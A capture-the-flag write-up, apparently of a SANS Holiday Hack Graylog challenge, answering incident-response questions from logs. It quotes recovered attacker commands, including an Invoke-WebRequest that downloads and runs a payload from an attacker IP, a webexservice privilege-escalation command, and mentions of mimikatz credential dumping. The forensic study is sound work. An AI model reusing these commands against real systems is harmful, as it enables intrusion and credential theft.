---
layout: elf
title: "Graylog"
#date: 2018-12-03
#image: "challenge.md"
question: "Fill out incident response report"
answer: ""
#terminal-hint: "Describe the hints from the terminal"
images: ["1.png"]
#narrative: "1"
elf-name: "Pepper Minstix"
elf-directory: "pepper"
tags: [sample post, readability, test]
comments: false
image-dir: /assets/img/elves/pepper
links: [http://docs.graylog.org/en/3.1/pages/queries.html,]
location: Dorm
comments: false
---

Need to fill out an incident reponse ticket on Graylog.

Search in All Messages
username and password are "elfustudent"


<figure>
	<img src="/assets/img/elves/pepper/question.jpg">
	<figcaption>Holly Question</figcaption>
</figure>

There are a set of questions that have to be answered
Question 1:
Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.

What is the full-path + filename of the first malicious file downloaded by Minty?

NOTE: Previous searches are in the search box.  cookie_recipe.exe is one of them.  This is likely the answer

c:\Users\minty\Downloads\cookie_recipe.exe

looks like it was downloaded from super_secret_elfu_research.pdf

<figure>
	<img src="/assets/img/elves/pepper/q1.jpg">
	<figcaption>Question 1</figcaption>
</figure>

Second question asks for the ip and port that cookie_recipe.exe tried to connect to. 

Searching for cookie_recipe.exe, found a web request
192.168.247.175:4444


<figure>
	<img src="/assets/img/elves/pepper/q2-answer.jpg">
	<figcaption>Question2</figcaption>
</figure>

What is the first command executed by the attacker

Looking at all the programs spawned by cookie_recipe, there is a PID of 5256
Looking for all ParentPID of 5256, found the first command, whoami

<figure>
	<img src="/assets/img/elves/pepper/q3-answer.jpg">
	<figcaption>Question2</figcaption>
</figure>

The following are all the commands

* whoami
* ls
* ls c:\
* sc query type=service
* Get-Service
* cmd /c sc query type=service
* Invoke-WebRequest-URI http://192.168.247.1.75/cookie_recipe2.exe -Outfile cookie_recipe2.exe
* ls
* ./cookie_recipe2.exe
* ls
* sc start webexservice a software-update 1 wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe"
* cmd.exe /c sc start webexservice a software-update 1 wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe"
* ls
* exit

<figure>
	<img src="/assets/img/elves/pepper/q3.jpg">
	<figcaption>Question3</figcaption>
</figure>

The one word service name for priv escalation is webexservice

<figure>
	<img src="/assets/img/elves/pepper/q4.jpg">
	<figcaption>Question4</figcaption>
</figure>

Find the filename of the executable used to dump credentials.  I tried to look for EventID of 10, but no luck

So I just looked for all text with "mimikatz".  Found c:\cookie.exe executing

<figure>
	<img src="/assets/img/elves/pepper/q5.jpg">
	<figcaption>Question5</figcaption>
</figure>

Question 6, I have to find what account was used to pivot to Minty's computer

Filter: EventID: "4647"
<figure>
	<img src="/assets/img/elves/pepper/q6-1.jpg">
	<figcaption>Finding the logon</figcaption>
</figure>

The "alabaster" user account worked

<figure>
	<img src="/assets/img/elves/pepper/q6.jpg">
	<figcaption>Finding the logon</figcaption>
</figure>

Question 7 - What time was the successful login.
The 4647 was a logoff.  Need to now find when the logon occurred

Filter: LogonType:"10"
There were 4 logon attempts.  The forth one was correct
06:04:28
<figure>
	<img src="/assets/img/elves/pepper/q7.jpg">
	<figcaption>Finding logon time</figcaption>
</figure>

Question 7 - Finding the browsing of file, is likely SMB

Filtered timestamps between the login and logouts
Then, looked for everything that had an existing logontype
_exists_:LogonType

Then, just looked for a change in source and dest hostnames

ELFU-RES-WKS2,ELFU-RES-WKS3,3
<figure>
	<img src="/assets/img/elves/pepper/q8.jpg">
	<figcaption>Finding the third</figcaption>
</figure>

Question 9 - What is the name of the super secret file
I crafted a filter to look for pdf's
/.+\.pdf.+/
<figure>
	<img src="/assets/img/elves/pepper/q9.jpg">
	<figcaption>The File</figcaption>
</figure>

Question 10 - What is the IP of the destination.

Looking at the event above, I used graylog to tell me the events surrounding by 5 seconds
<figure>
	<img src="/assets/img/elves/pepper/q10.jpg">
	<figcaption>Pastbin</figcaption>
</figure>


Answer the report I get the final message
<figure>
	<img src="/assets/img/elves/pepper/answer.jpg">
	<figcaption>answer</figcaption>
</figure>

<figure>
	<img src="/assets/img/elves/pepper/riddle.jpg">
	<figcaption>Riddle</figcaption>
</figure>